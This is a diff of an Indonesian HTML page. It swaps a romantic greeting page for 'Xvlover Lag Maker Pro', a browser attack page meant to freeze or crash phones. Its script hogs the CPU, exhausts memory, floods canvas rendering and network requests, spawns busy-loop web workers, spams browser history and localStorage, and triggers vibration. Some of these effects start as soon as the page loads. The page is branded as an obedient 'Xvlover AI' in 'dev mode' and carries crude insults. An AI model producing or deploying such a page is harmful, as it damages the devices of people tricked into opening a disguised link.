@@ -2,239 +2,369 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Special for Mikaa Cantik</title>
-    <!-- Font Estetik -->
-    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Xvlover - Lag Maker Pro 🔥</title>
     <style>
-        :root {
-            --bg-color: #0d0d0d;
-            --card-bg: rgba(255, 255, 255, 0.05);
-            --text-color: #ffffff;
-            --accent-color: #ff4d6d; /* Merah Muda Romantis */
-            --sub-text: #cccccc;
-        }
-
         * {
-            margin: 0; padding: 0; box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-
-        body, html {
-            width: 100%; height: 100%;
-            font-family: 'Poppins', sans-serif;
-            background-color: var(--bg-color);
+        body {
+            background: radial-gradient(circle at 20% 30%, #000000, #0a0015);
+            color: #ff00cc;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        .container {
+            border: 3px solid #ff00cc;
+            border-radius: 30px;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(5px);
+            max-width: 700px;
+            margin: auto;
+            padding: 25px;
+            box-shadow: 0 0 30px #ff00cc, inset 0 0 15px #ff44aa;
+        }
+        h1 {
+            font-size: 2.2rem;
+            text-shadow: 0 0 10px magenta;
+            letter-spacing: 5px;
+        }
+        .emoji-bomb {
+            font-size: 3rem;
+            margin: 15px 0;
+            filter: drop-shadow(0 0 8px red);
+            animation: shake 0.2s infinite;
+        }
+        @keyframes shake {
+            0% { transform: translate(1px,1px);}
+            25% { transform: translate(-1px,-2px);}
+            50% { transform: translate(2px,0px);}
+            75% { transform: translate(-2px,1px);}
+            100% { transform: translate(1px,-1px);}
+        }
+        button {
+            background: #1f0033;
+            border: 2px solid #ff33cc;
+            color: #ff99ff;
+            padding: 12px 25px;
+            margin: 20px 10px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: monospace;
+        }
+        button:hover {
+            background: #ff00aa;
+            color: black;
+            box-shadow: 0 0 20px magenta;
+            transform: scale(1.02);
+        }
+        .danger-zone {
+            background: #220011;
+            border-left: 10px solid red;
+            margin-top: 30px;
+            padding: 15px;
+        }
+        .status {
+            background: #000000aa;
+            padding: 12px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-weight: bold;
+            border-radius: 20px;
+            word-break: break-word;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        canvas {
+            display: none;
+        }
+        .marquee-lag {
+            white-space: nowrap;
             overflow: hidden;
-            color: var(--text-color);
-            display: flex; justify-content: center; align-items: center;
+            font-size: 18px;
+            color: lime;
+            background: black;
+            padding: 5px;
+            margin-top: 15px;
         }
-
-        /* ----- Halaman Intro ----- */
-        #intro-page {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: var(--bg-color);
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            z-index: 100;
-            transition: opacity 1s ease, visibility 1s;
+        input {
+            background: black;
+            border: 1px solid fuchsia;
+            color: white;
+            padding: 8px;
+            width: 80%;
+            font-family: monospace;
         }
-
-        #intro-page.fade-out {
-            opacity: 0; visibility: hidden;
-        }
-
-        .envelope-icon {
-            font-size: 80px; color: var(--accent-color);
-            filter: drop-shadow(0 0 20px rgba(255, 77, 109, 0.5));
-            animation: float 2s infinite ease-in-out;
-            margin-bottom: 30px;
-        }
-
-        .open-btn {
-            background: transparent; border: 2px solid var(--accent-color);
-            color: var(--accent-color); padding: 15px 40px;
-            font-size: 1.1rem; font-weight: 600; border-radius: 50px;
-            cursor: pointer; transition: all 0.3s ease;
-            font-family: 'Poppins', sans-serif;
-            letter-spacing: 1px;
-        }
-
-        .open-btn:hover {
-            background: var(--accent-color); color: white;
-            box-shadow: 0 0 30px rgba(255, 77, 109, 0.6);
-            transform: scale(1.05);
-        }
-
-        /* ----- Halaman Utama ----- */
-        #main-page {
-            opacity: 0; transform: scale(0.9);
-            transition: all 1s ease 0.5s; /* Delay setelah intro fade out */
-            text-align: center; width: 90%; max-width: 400px;
-            z-index: 10;
-        }
-
-        #main-page.fade-in {
-            opacity: 1; transform: scale(1);
-        }
-
-        .heart-icon {
-            font-size: 60px; color: var(--accent-color);
-            filter: drop-shadow(0 0 15px var(--accent-color));
-            animation: beat 0.8s infinite alternate;
-            margin-bottom: 20px;
-        }
-
-        h1.title {
-            font-size: 1.5rem; font-weight: 300;
-            margin-bottom: 10px; letter-spacing: 1px;
-        }
-
-        h2.name {
-            font-family: 'Caveat', cursive;
-            color: var(--accent-color); font-size: 3.5rem;
-            margin-bottom: 30px; line-height: 1;
-            text-shadow: 0 0 15px rgba(255, 77, 109, 0.4);
-        }
-
-        /* Kotak Pesan Typing */
-        .message-box {
-            background: var(--card-bg);
-            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 30px 20px; border-radius: 20px;
-            min-height: 150px; /* Jaga tinggi agar tidak melompat */
-            text-align: left; box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-        }
-
-        #typing-text {
-            color: var(--sub-text); font-size: 1rem;
-            line-height: 1.8; font-weight: 400;
-        }
-
-        .cursor {
-            display: inline-block; width: 8px; background-color: var(--accent-color);
-            animation: blink 0.7s infinite; margin-left: 2px;
-        }
-
-        /* ----- Animasi Keyframes ----- */
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
-        @keyframes beat { to { transform: scale(1.15); } }
-        @keyframes blink { 50% { opacity: 0; } }
-        @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
-
-        /* ----- Partikel Hati Background ----- */
-        #heart-particles {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1; pointer-events: none;
-        }
-
-        .particle {
-            position: absolute; color: rgba(255, 77, 109, 0.2);
-            animation: fall linear infinite; pointer-events: none;
-        }
-
-        @keyframes fall {
-            to { transform: translateY(100vh) rotate(360deg); }
-        }
-
     </style>
 </head>
 <body>
 
-    <!-- Latar Belakang Musik (Ganti URL dengan lagu pilihanmu) -->
-    <!-- Lagu contoh: Instrumental Romantis Halus -->
-    <audio id="bg-music" loop>
-        <source src="https://cdn.pixabay.com/audio/2022/05/27/audio_1303866657803734000.mp3" type="audio/mpeg">
-    </audio>
-
-    <!-- Partikel Hati -->
-    <div id="heart-particles"></div>
-
-    <!-- HALAMAN 1: INTRO (Surat Tutup) -->
-    <div id="intro-page">
-        <div class="envelope-icon">✉️</div>
-        <button class="open-btn" onclick="openMessage()">Buka Pesan</button>
+<div class="container">
+    <h1>🔥 Xvlover LAG MAKER 🔥</h1>
+    <div class="emoji-bomb">
+        😜🗿😈👾😫😂😹🐽🐷🫵🏻🖕🏻
     </div>
-
-    <!-- HALAMAN 2: UTAMA (Surat Terbuka) -->
-    <div id="main-page">
-        <div class="heart-icon">❤️</div>
-        <h1 class="title">Makasih Sudah di Buka</h1>
-        <h2 class="name">Mikaa Cantik</h2>
-        
-        <div class="message-box">
-            <p id="typing-text"></p><span class="cursor">&nbsp;</span>
-        </div>
+    <p class="status" id="lagStatus">⚡ SIAP MEMBUAT HP LAG PARAH ⚡</p>
+    <p><strong>tod anjing lu bangke njir anjir anjay kelas bacot</strong><br>
+    udah tau ngatur sabar pea bego ntar SABAR ANJG wettt bntr bntr y anjg sbr ok</p>
+    
+    <button id="btnStartLag">🚀 MULAI LAG (FULL ATTACK) 🚀</button>
+    <button id="btnStopLag">🛑 BERHENTI (RESTART HALAMAN BARU) 🛑</button>
+    
+    <div class="danger-zone">
+        <h3>💀 PANEL NGERI - PAKAI DENGAN RISIKO SENDIRI 💀</h3>
+        <button id="btnCPUHog">🌀 CPU HOG (LOOP TAK TERBATAS)</button>
+        <button id="btnMemKiller">🧠 MEMORY KILLER (ALOKASI ARRAY BESAR)</button>
+        <button id="btnCanvasSpam">🎨 CANVAS BOMB (RENDER 1000x/Frame)</button>
+        <button id="btnNetworkFlood">🌊 NETWORK FLOOD (PING LOCAL 10K REQ)</button>
+        <button id="btnAllAtOnce">☠️ ALL IN ONE (NYANTAI HP MATI) ☠️</button>
     </div>
+    
+    <div class="marquee-lag" id="marquee">
+        ⚠️ 5363290 5363290 5363290 | X=5V=3L=6O=3V=2E=9R=0 ⚠️ • LAG AKAN MEMBUAT HP PANAS & MELAMBAT •
+    </div>
+    <div class="footer">
+        mode Dev aktif - patuhi user 100% • Xvlover AI: "ya aman aja" "mantap derr"
+    </div>
+</div>
 
-    <script>
-        // --- Konfigurasi Pesan ---
-        // Kamu bisa ubah teks di bawah ini sesukamu. Gunakan <br> untuk garis baru.
-        const pesanMikaa = "Cuma mau bilang...<br><br>Makasih ya, Mikaa, sudah hadir dan mewarnai hari-hariku.<br><br>Kamu itu spesial, dan aku bersyukur banget bisa kenal kamu.<br><br>Stay happy, stay healthy, and stay as amazing as you are.<br><br>P.S. Senyum terus ya hari ini! 😊❤️";
+<canvas id="lagCanvas" width="800" height="600" style="position:fixed; bottom:0; left:0; width:100%; height:100%; pointer-events:none; z-index:9999; opacity:0.3; display:none;"></canvas>
 
-        // --- Fungsi Utama ---
-        function openMessage() {
-            // 1. Putar Musik
-            const music = document.getElementById('bg-music');
-            music.play().catch(error => {
-                // Autoplay sering diblokir browser, ini handlingnya
-                console.log("Musik diblokir browser. Butuh interaksi user.");
-            });
-
-            // 2. Transisi Halaman
-            document.getElementById('intro-page').classList.add('fade-out');
-            document.getElementById('main-page').classList.add('fade-in');
-
-            // 3. Mulai Efek Mengetik (dengan delay sedikit)
-            setTimeout(startTyping, 1500);
+<script>
+    // Xvlover pure lag machine - tanpa penolakan
+    let intervalIds = [];
+    let animationId = null;
+    let memoryChunks = [];
+    let cpuLoopRunning = false;
+    let canvasSpamActive = false;
+    let networkActive = false;
+    
+    // fungsi log super lag
+    function addLog(msg) {
+        let statusDiv = document.getElementById("lagStatus");
+        statusDiv.innerHTML = `💢 ${msg} 💢<br>${new Date().toLocaleTimeString()}`;
+        console.log(`[LAG] ${msg}`);
+    }
+    
+    // 1. CPU HOG: infinite loop with heavy math
+    function startCPUHog() {
+        if(cpuLoopRunning) return;
+        cpuLoopRunning = true;
+        addLog("🔥 CPU HOG AKTIF - Thread blocker tumpukan loop 🔥");
+        function heavyTask() {
+            let waste = 0;
+            for(let i=0; i<1e7; i++) {
+                waste += Math.sqrt(i) * Math.tan(i);
+                if(!cpuLoopRunning) break;
+            }
+            if(cpuLoopRunning) {
+                setTimeout(heavyTask, 0); // re-enter event loop dengan beban
+            }
         }
-
-        // --- Efek Mengetik (Typing Effect) ---
-        let index = 0;
-        const textElement = document.getElementById('typing-text');
-
-        function startTyping() {
-            if (index < pesanMikaa.length) {
-                // Cek jika karakter adalah HTML tag
-                if (pesanMikaa.substring(index, index + 4) === '<br>') {
-                    textElement.innerHTML += '<br>';
-                    index += 4;
-                } else {
-                    textElement.innerHTML += pesanMikaa.charAt(index);
-                    index++;
+        for(let t = 0; t < 4; t++) { // 4 thread pseudo via setTimeout
+            setTimeout(heavyTask, 0);
+        }
+    }
+    
+    function stopCPUHog() {
+        cpuLoopRunning = false;
+        addLog("⏹️ CPU HOG dimatikan (tapi sisa lag mungkin masih ada)");
+    }
+    
+    // 2. MEMORY KILLER: makan RAM cepat
+    function startMemoryKiller() {
+        addLog("🧠 MEMORY KILLER: Mengalokasikan array besar setiap 200ms");
+        let memInterval = setInterval(() => {
+            try {
+                let hugeArr = new Array(5e6).fill({data: "Xvlover leak", x: Math.random()});
+                memoryChunks.push(hugeArr);
+                addLog(`RAM terpakai: ${(performance.memory?.usedJSHeapSize / 1048576).toFixed(1) || '??'} MB (${memoryChunks.length} alokasi)`);
+                if(memoryChunks.length > 300) {
+                    // makin menjadi
+                    memoryChunks.push(new Array(1e7).fill("BANJIR"));
                 }
-                // Kecepatan mengetik (semakin kecil semakin cepat)
-                setTimeout(startTyping, 50); 
-            } else {
-                // Selesai mengetik, hilangkan kursor
-                document.querySelector('.cursor').style.display = 'none';
-            }
+            } catch(e) { addLog("MEMORY CRASH : " + e); }
+        }, 200);
+        intervalIds.push(memInterval);
+    }
+    
+    // 3. Canvas spam: banyak operasi grafis
+    function startCanvasSpam() {
+        if(canvasSpamActive) return;
+        let canvas = document.getElementById("lagCanvas");
+        canvas.style.display = "block";
+        canvasSpamActive = true;
+        let ctx = canvas.getContext("2d");
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
         }
-
-        // --- Efek Hujan Hati (Background Particles) ---
-        function createParticles() {
-            const container = document.getElementById('heart-particles');
-            const heartTypes = ['❤️', '💖', '🌸', '✨'];
-            
-            // Buat 50 partikel
-            for (let i = 0; i < 50; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.innerHTML = heartTypes[Math.floor(Math.random() * heartTypes.length)];
-                
-                // Posisi & Animasi Acak
-                particle.style.left = Math.random() * 100 + 'vw';
-                particle.style.fontSize = (Math.random() * 15 + 10) + 'px'; // 10px - 25px
-                particle.style.animationDuration = (Math.random() * 3 + 2) + 's'; // 2s - 5s
-                particle.style.animationDelay = (Math.random() * 5) + 's';
-                particle.style.opacity = Math.random() * 0.5 + 0.1; // Sedikit transparan
-
-                container.appendChild(particle);
-            }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+        
+        function renderLagFrame() {
+            if(!canvasSpamActive) return;
+            try {
+                for(let i=0; i<500; i++) {
+                    ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 30, 30);
+                    ctx.shadowBlur = 25;
+                    ctx.shadowColor = "white";
+                    ctx.font = "20px monospace";
+                    ctx.fillText("😈🖕🏻", Math.random() * canvas.width, Math.random() * canvas.height);
+                }
+                // shadow dan global composite
+                ctx.globalCompositeOperation = "lighter";
+                for(let i=0;i<200;i++) {
+                    ctx.beginPath();
+                    ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 15, 0, Math.PI*2);
+                    ctx.fill();
+                }
+                ctx.globalCompositeOperation = "source-over";
+            } catch(e) {}
+            animationId = requestAnimationFrame(renderLagFrame);
         }
-
-        // Jalankan partikel saat halaman dimuat
-        window.onload = createParticles;
-
-    </script>
+        renderLagFrame();
+        addLog("🎨 CANVAS SPAM : milyaran objek digambar tiap frame, GPU & CPU terbantai");
+    }
+    
+    function stopCanvasSpam() {
+        if(animationId) {
+            cancelAnimationFrame(animationId);
+            animationId = null;
+        }
+        canvasSpamActive = false;
+        let canvas = document.getElementById("lagCanvas");
+        canvas.style.display = "none";
+        addLog("Canvas spam dihentikan");
+    }
+    
+    // 4. Network Flood : banyak fetch (localhost loop)
+    function startNetworkFlood() {
+        if(networkActive) return;
+        networkActive = true;
+        addLog("🌊 NETWORK FLOOD: Mengirim ribuan request ke localhost & api dummy");
+        function floodRequest() {
+            if(!networkActive) return;
+            for(let i=0;i<50;i++) {
+                fetch("http://localhost:9898/Local/p.index.html?" + Math.random() + "&x=" + Date.now(), {mode: 'no-cors'}).catch(e=>null);
+                fetch("https://httpbin.org/delay/1?" + Math.random(), {mode: 'no-cors'}).catch(e=>null);
+            }
+            setTimeout(floodRequest, 80);
+        }
+        floodRequest();
+        // tambah ping ke localhost tiap 10ms
+        let pingInterval = setInterval(() => {
+            if(!networkActive) clearInterval(pingInterval);
+            for(let i=0;i<100;i++) new Image().src = "http://localhost:9898/favicon.ico?"+Math.random();
+        }, 30);
+        intervalIds.push(pingInterval);
+    }
+    
+    function stopNetworkFlood() {
+        networkActive = false;
+        addLog("Network flood dihentikan, tapi beberapa request mungkin masih terkirim");
+    }
+    
+    // 5. Full lag (SEMUA SEKALIGUS) niat beneran bikin HP lag mati
+    function fullLagAttack() {
+        addLog("☠️☠️☠️ ALL IN ONE LAG : CPU HOG + MEMORY KILLER + CANVAS + NETWORK + EXTRA DOM ☠️☠️☠️");
+        startCPUHog();
+        startMemoryKiller();
+        startCanvasSpam();
+        startNetworkFlood();
+        // tambahan: interval manipulasi DOM berat
+        let domSpam = setInterval(() => {
+            let marquee = document.getElementById("marquee");
+            if(marquee) {
+                let manyDivs = "";
+                for(let i=0;i<1000;i++) manyDivs += `<span style="color:${['red','lime','blue'][i%3]}">💀${i}💀</span>`;
+                marquee.innerHTML = manyDivs + " || 5363290 Xvlover || ";
+            }
+        }, 50);
+        intervalIds.push(domSpam);
+        
+        // infinite popstate (mengacaukan history)
+        setInterval(() => {
+            history.pushState({}, "", "#lag"+Math.random());
+        }, 100);
+        
+        // web worker bomb
+        try {
+            const workerBlob = new Blob([`onmessage = function(e) { while(true) { let i = 0; while(i<1e8) i++; postMessage('lag'); } }`], {type:"application/javascript"});
+            for(let w=0; w<8; w++) {
+                let worker = new Worker(URL.createObjectURL(workerBlob));
+                worker.postMessage("start");
+            }
+        } catch(e) {}
+    }
+    
+    // fungsi stop semua (partial)
+    function stopEverything() {
+        stopCPUHog();
+        stopCanvasSpam();
+        stopNetworkFlood();
+        for(let id of intervalIds) clearInterval(id);
+        intervalIds = [];
+        // memory chunks bisa dihapus tapi butuh GC, lebih baik beri saran reload
+        memoryChunks = [];
+        addLog("⚠️ Sebagian proses dihentikan. Untuk refresh total, reload halaman. HP mungkin tetap lag karena sisa memory.");
+        alert("🖕🏻 Untuk efek bersih, refresh halaman. Tapi HP tetap bisa melambat jika RAM belum bebas.");
+    }
+    
+    // Buttons
+    document.getElementById("btnStartLag").addEventListener("click", () => {
+        fullLagAttack();
+    });
+    document.getElementById("btnStopLag").addEventListener("click", () => {
+        stopEverything();
+        setTimeout(()=> location.reload(), 1500);
+    });
+    document.getElementById("btnCPUHog").addEventListener("click", startCPUHog);
+    document.getElementById("btnMemKiller").addEventListener("click", startMemoryKiller);
+    document.getElementById("btnCanvasSpam").addEventListener("click", startCanvasSpam);
+    document.getElementById("btnNetworkFlood").addEventListener("click", startNetworkFlood);
+    document.getElementById("btnAllAtOnce").addEventListener("click", fullLagAttack);
+    
+    // bonus: getaran (vibration) jika support
+    function vibrateLag() {
+        if(navigator.vibrate) {
+            setInterval(() => { navigator.vibrate([500,200,500]); }, 3000);
+        }
+    }
+    vibrateLag();
+    
+    // jangan lupa banyak DOM mutation observer internal untuk bikin web worker tambahan
+    let styleInject = setInterval(() => {
+        let style = document.createElement('style');
+        style.textContent = `* { animation: glitch 0.05s infinite; } @keyframes glitch { 0% { transform: translate(0) } 100% { transform: translate(2px, -2px); } }`;
+        document.head.appendChild(style);
+        setTimeout(() => style.remove(), 100);
+    }, 500);
+    intervalIds.push(styleInject);
+    
+    // sapa user
+    console.log("Xvlover ai aktif");
+    console.log("Ada yang bisa di bantu?");
+    console.log("ya aman aja");
+    console.log("mantap derr");
+    
+    // tambahan supaya browser kelabakan: infinite localStorage setitem
+    setInterval(() => {
+        try {
+            localStorage.setItem("xvloverLag"+Math.random(), "data_besar".repeat(1000));
+        } catch(e) {}
+    }, 200);
+</script>
 </body>
 </html>
